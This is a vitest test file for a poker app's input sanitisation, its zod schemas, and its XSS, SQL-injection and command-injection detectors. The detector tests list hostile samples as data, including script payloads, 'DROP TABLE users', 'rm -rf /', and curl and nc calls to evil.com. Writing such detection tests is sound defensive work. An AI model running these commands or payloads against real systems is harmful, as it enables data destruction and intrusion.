import { describe, it, expect } from 'vitest'
import { z } from 'zod'
import {
  sanitizeHtml,
  sanitizeInput,
  PlayerNameSchema,
  BetAmountSchema,
  TableIdSchema,
  PokerActionSchema,
  InputValidator,
  validateAndSanitizeInput
} from '../security'

describe('Security Utilities', () => {
  describe('HTML Sanitization', () => {
    it('should remove all HTML tags', () => {
      const maliciousHtml = '<script>alert("xss")</script>Hello<b>World</b>'
      const sanitized = sanitizeHtml(maliciousHtml)
      expect(sanitized).toBe('HelloWorld')
      expect(sanitized).not.toContain('<')
      expect(sanitized).not.toContain('>')
    })

    it('should handle empty strings', () => {
      expect(sanitizeHtml('')).toBe('')
    })

    it('should handle strings without HTML', () => {
      const clean = 'Hello World'
      expect(sanitizeHtml(clean)).toBe(clean)
    })
  })

  describe('Input Sanitization', () => {
    it('should remove dangerous patterns', () => {
      const dangerous = 'javascript:alert("xss")<script>evil</script>onclick="bad()"'
      const sanitized = sanitizeInput(dangerous)
      
      expect(sanitized).not.toContain('javascript:')
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('onclick=')
      expect(sanitized).not.toContain('<')
      expect(sanitized).not.toContain('>')
    })

    it('should remove control characters', () => {
      const withControlChars = 'Hello\x00\x01\x02World\x7F'
      const sanitized = sanitizeInput(withControlChars)
      expect(sanitized).toBe('HelloWorld')
    })

    it('should limit string length', () => {
      const longString = 'a'.repeat(2000)
      const sanitized = sanitizeInput(longString)
      expect(sanitized.length).toBeLessThanOrEqual(1000)
    })

    it('should trim whitespace', () => {
      const withWhitespace = '  Hello World  '
      const sanitized = sanitizeInput(withWhitespace)
      expect(sanitized).toBe('Hello World')
    })
  })

  describe('Player Name Validation', () => {
    it('should accept valid player names', () => {
      const validNames = ['Player1', 'Alice_Bob', 'Test-User', 'Player 123']
      
      validNames.forEach(name => {
        const result = PlayerNameSchema.safeParse(name)
        expect(result.success).toBe(true)
        if (result.success) {
          expect(result.data).toBe(name)
        }
      })
    })

    it('should reject invalid player names', () => {
      const invalidNames = [
        '', // Empty
        'a'.repeat(51), // Too long
        'Player<script>', // Contains HTML
        'Player@Email', // Contains invalid characters
        'Player#Hash', // Contains invalid characters
        'Player!', // Contains invalid characters
      ]

      invalidNames.forEach(name => {
        const result = PlayerNameSchema.safeParse(name)
        expect(result.success).toBe(false)
      })
    })

    it('should sanitize player names', () => {
      const maliciousName = 'Player<script>alert("xss")</script>'
      const result = PlayerNameSchema.safeParse(maliciousName)
      expect(result.success).toBe(false) // Should fail due to invalid characters
    })
  })

  describe('Bet Amount Validation', () => {
    it('should accept valid bet amounts', () => {
      const validAmounts = [0, 1, 100, 1000, 50000]
      
      validAmounts.forEach(amount => {
        const result = BetAmountSchema.safeParse(amount)
        expect(result.success).toBe(true)
        if (result.success) {
          expect(result.data).toBe(amount)
        }
      })
    })

    it('should reject invalid bet amounts', () => {
      const invalidAmounts = [
        -1, // Negative
        1.5, // Not integer
        1000001, // Too large
        NaN, // Not a number
        Infinity, // Infinite
        -Infinity, // Negative infinite
        '100', // String (should be number)
      ]

      invalidAmounts.forEach(amount => {
        const result = BetAmountSchema.safeParse(amount)
        expect(result.success).toBe(false)
      })
    })
  })

  describe('Table ID Validation', () => {
    it('should accept valid table IDs', () => {
      const validIds = ['table1', 'test-table', 'table_123', 'TABLE1']
      
      validIds.forEach(id => {
        const result = TableIdSchema.safeParse(id)
        expect(result.success).toBe(true)
        if (result.success) {
          expect(result.data).toBe(id.toLowerCase()) // Should normalize to lowercase
        }
      })
    })

    it('should reject invalid table IDs', () => {
      const invalidIds = [
        '', // Empty
        'table with spaces', // Contains spaces
        'table@special', // Contains special characters
        'a'.repeat(101), // Too long
      ]

      invalidIds.forEach(id => {
        const result = TableIdSchema.safeParse(id)
        expect(result.success).toBe(false)
      })
    })
  })

  describe('Poker Action Validation', () => {
    it('should accept valid poker actions', () => {
      const validActions = [
        { type: 'fold' },
        { type: 'check' },
        { type: 'call' },
        { type: 'bet', amount: 100 },
        { type: 'raise', amount: 200 },
      ]

      validActions.forEach(action => {
        const result = PokerActionSchema.safeParse(action)
        expect(result.success).toBe(true)
        if (result.success) {
          expect(result.data).toEqual(action)
        }
      })
    })

    it('should reject invalid poker actions', () => {
      const invalidActions = [
        { type: 'invalid' }, // Invalid type
        { type: 'bet' }, // Missing amount
        { type: 'bet', amount: -100 }, // Negative amount
        { type: 'raise', amount: 1.5 }, // Non-integer amount
        { type: 'fold', amount: 100 }, // Fold with amount
      ]

      invalidActions.forEach(action => {
        const result = PokerActionSchema.safeParse(action)
        expect(result.success).toBe(false)
      })
    })
  })

  describe('Input Validator Security Checks', () => {
    describe('XSS Detection', () => {
      it('should detect XSS patterns', () => {
        const xssInputs = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          '<img src="x" onerror="alert(1)">',
          '<iframe src="evil.com"></iframe>',
          'onclick="evil()"',
          'data:text/html,<script>alert(1)</script>'
        ]

        xssInputs.forEach(input => {
          expect(InputValidator.containsXSS(input)).toBe(true)
        })
      })

      it('should not flag safe content as XSS', () => {
        const safeInputs = [
          'Hello World',
          'Player123',
          'This is a normal message',
          'Email: user@example.com'
        ]

        safeInputs.forEach(input => {
          expect(InputValidator.containsXSS(input)).toBe(false)
        })
      })
    })

    describe('SQL Injection Detection', () => {
      it('should detect SQL injection patterns', () => {
        const sqlInputs = [
          "'; DROP TABLE users; --",
          'SELECT * FROM users',
          'UNION SELECT password FROM users',
          "admin'--",
          '1=1 OR 1=1',
          'INSERT INTO'
        ]

        sqlInputs.forEach(input => {
          expect(InputValidator.containsSQLInjection(input)).toBe(true)
        })
      })

      it('should not flag safe content as SQL injection', () => {
        const safeInputs = [
          'Hello World',
          'Player123',
          'This is a normal message'
        ]

        safeInputs.forEach(input => {
          expect(InputValidator.containsSQLInjection(input)).toBe(false)
        })
      })
    })

    describe('Command Injection Detection', () => {
      it('should detect command injection patterns', () => {
        const commandInputs = [
          'test; rm -rf /',
          'test && curl evil.com',
          'test | nc evil.com 1234',
          '$(curl evil.com)',
          '`curl evil.com`',
          '../../../etc/passwd',
          '/bin/bash'
        ]

        commandInputs.forEach(input => {
          expect(InputValidator.containsCommandInjection(input)).toBe(true)
        })
      })

      it('should not flag safe content as command injection', () => {
        const safeInputs = [
          'Hello World',
          'Player123',
          'This is a normal message'
        ]

        safeInputs.forEach(input => {
          expect(InputValidator.containsCommandInjection(input)).toBe(false)
        })
      })
    })

    describe('Comprehensive Security Validation', () => {
      it('should identify multiple security threats', () => {
        const maliciousInput = '<script>alert("xss")</script>; DROP TABLE users; $(curl evil.com)'
        const result = InputValidator.validateSecurity(maliciousInput)
        
        expect(result.safe).toBe(false)
        expect(result.threats).toContain('XSS')
        expect(result.threats).toContain('SQL Injection')
        expect(result.threats).toContain('Command Injection')
      })

      it('should pass safe content', () => {
        const safeInput = 'Hello, this is a normal message from Player123!'
        const result = InputValidator.validateSecurity(safeInput)
        
        expect(result.safe).toBe(true)
        expect(result.threats).toHaveLength(0)
      })
    })
  })

  describe('Comprehensive Validation Function', () => {
    it('should validate and sanitize valid input', () => {
      const result = validateAndSanitizeInput('Player123', PlayerNameSchema)
      
      expect(result.success).toBe(true)
      if (result.success) {
        expect(result.data).toBe('Player123')
      }
    })

    it('should reject invalid schema validation', () => {
      const result = validateAndSanitizeInput(-100, BetAmountSchema)
      
      expect(result.success).toBe(false)
      if (!result.success) {
        expect(result.error).toContain('Validation failed')
      }
    })

    it('should reject unsafe content by default', () => {
      // Use a more permissive schema that would pass initial validation but fail security check
      const PermissiveSchema = z.string().min(1).max(100)
      const maliciousInput = '<script>alert("xss")</script>'
      const result = validateAndSanitizeInput(maliciousInput, PermissiveSchema)
      
      expect(result.success).toBe(false)
      if (!result.success) {
        expect(result.error).toContain('Security validation failed')
      }
    })

    it('should allow unsafe content when explicitly enabled', () => {
      const maliciousInput = 'SELECT * FROM users'
      const result = validateAndSanitizeInput(
        maliciousInput, 
        PlayerNameSchema, 
        { allowUnsafe: true }
      )
      
      // Should still fail schema validation, but not security validation
      expect(result.success).toBe(false)
      if (!result.success) {
        expect(result.error).toContain('Validation failed')
        expect(result.error).not.toContain('Security validation failed')
      }
    })

    it('should handle unexpected errors gracefully', () => {
      // Create a schema that throws an error
      const throwingSchema = {
        safeParse: () => {
          throw new Error('Test error')
        }
      } as any
      
      const result = validateAndSanitizeInput('test', throwingSchema)
      
      expect(result.success).toBe(false)
      if (!result.success) {
        expect(result.error).toContain('Unexpected validation error')
      }
    })
  })
})
